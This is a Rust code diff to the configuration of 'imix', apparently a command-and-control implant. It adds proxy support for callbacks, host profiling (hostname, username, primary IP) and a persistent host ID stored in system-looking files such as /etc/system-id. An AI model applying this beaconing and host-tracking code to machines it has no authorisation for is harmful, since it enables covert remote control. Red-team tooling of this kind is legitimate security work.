@@ -1,5 +1,5 @@
 use crate::version::VERSION;
-use c2::pb::host::Platform;
+use pb::c2::host::Platform;
 use std::{
     fs::{self, File},
     io::Write,
@@ -15,6 +15,17 @@ macro_rules! callback_uri {
         }
     };
 }
+
+/*
+ * Compile-time constant for the agent proxy URI, derived from the IMIX_PROXY_URI environment variable during compilation.
+ * Defaults to None if this is unset.
+ */
+macro_rules! proxy_uri {
+    () => {
+        option_env!("IMIX_PROXY_URI")
+    };
+}
+
 /*
  * Compile-time constant for the agent callback URI, derived from the IMIX_CALLBACK_URI environment variable during compilation.
  * Defaults to "http://127.0.0.1:80/grpc" if this is unset.
@@ -52,8 +63,9 @@ pub const RETRY_INTERVAL: &str = retry_interval!();
  */
 #[derive(Debug, Clone)]
 pub struct Config {
-    pub info: c2::pb::Beacon,
+    pub info: pb::c2::Beacon,
     pub callback_uri: String,
+    pub proxy_uri: Option<String>,
     pub retry_interval: u64,
 }
 
@@ -62,18 +74,18 @@ pub struct Config {
  */
 impl Default for Config {
     fn default() -> Self {
-        let agent = c2::pb::Agent {
+        let agent = pb::c2::Agent {
             identifier: format!("imix-v{}", VERSION),
         };
 
-        let host = c2::pb::Host {
-            name: whoami::hostname(),
+        let host = pb::c2::Host {
+            name: whoami::fallible::hostname().unwrap_or(String::from("")),
             identifier: get_host_id(get_host_id_path()),
             platform: get_host_platform() as i32,
             primary_ip: get_primary_ip(),
         };
 
-        let info = c2::pb::Beacon {
+        let info = pb::c2::Beacon {
             identifier: String::from(Uuid::new_v4()),
             principal: whoami::username(),
             interval: match CALLBACK_INTERVAL.parse::<u64>() {
@@ -92,6 +104,7 @@ impl Default for Config {
         Config {
             info,
             callback_uri: String::from(CALLBACK_URI),
+            proxy_uri: get_system_proxy(),
             retry_interval: match RETRY_INTERVAL.parse::<u64>() {
                 Ok(i) => i,
                 Err(_err) => {
@@ -100,9 +113,70 @@ impl Default for Config {
                         "failed to parse retry interval constant, defaulting to 5 seconds: {_err}"
                     );
 
-                    5_u64
+                    5
                 }
             },
+        }
+    }
+}
+
+fn get_system_proxy() -> Option<String> {
+    let proxy_uri_compile_time_override = proxy_uri!();
+    if let Some(proxy_uri) = proxy_uri_compile_time_override {
+        return Some(proxy_uri.to_string());
+    }
+
+    #[cfg(target_os = "linux")]
+    {
+        match std::env::var("http_proxy") {
+            Ok(val) => return Some(val),
+            Err(_e) => {
+                #[cfg(debug_assertions)]
+                log::debug!("Didn't find http_proxy env var: {}", _e);
+            }
+        }
+
+        match std::env::var("https_proxy") {
+            Ok(val) => return Some(val),
+            Err(_e) => {
+                #[cfg(debug_assertions)]
+                log::debug!("Didn't find https_proxy env var: {}", _e);
+            }
+        }
+        None
+    }
+    #[cfg(target_os = "windows")]
+    {
+        None
+    }
+    #[cfg(target_os = "macos")]
+    {
+        None
+    }
+    #[cfg(target_os = "freebsd")]
+    {
+        None
+    }
+}
+
+impl Config {
+    pub fn refresh_primary_ip(&mut self) {
+        let fresh_ip = get_primary_ip();
+        if self
+            .info
+            .host
+            .as_ref()
+            .is_some_and(|h| h.primary_ip != fresh_ip)
+        {
+            match self.info.host.as_mut() {
+                Some(h) => {
+                    h.primary_ip = fresh_ip;
+                }
+                None => {
+                    #[cfg(debug_assertions)]
+                    log::error!("host struct was never initialized, failed to set primary ip");
+                }
+            }
         }
     }
 }
@@ -141,8 +215,14 @@ fn get_host_id_path() -> String {
     #[cfg(target_os = "windows")]
     return String::from("C:\\ProgramData\\system-id");
 
-    #[cfg(not(target_os = "windows"))]
+    #[cfg(target_os = "linux")]
     return String::from("/etc/system-id");
+
+    #[cfg(target_os = "macos")]
+    return String::from("/Users/Shared/system-id");
+
+    #[cfg(target_os = "freebsd")]
+    return String::from("/etc/systemd-id");
 }
 
 /*
@@ -155,7 +235,9 @@ fn get_host_id(file_path: String) -> String {
     // Read Existing Host ID
     let path = Path::new(file_path.as_str());
     if path.exists() {
-        if let Ok(host_id) = fs::read_to_string(path) { return host_id.trim().to_string() }
+        if let Ok(host_id) = fs::read_to_string(path) {
+            return host_id.trim().to_string();
+        }
     }
 
     // Generate New
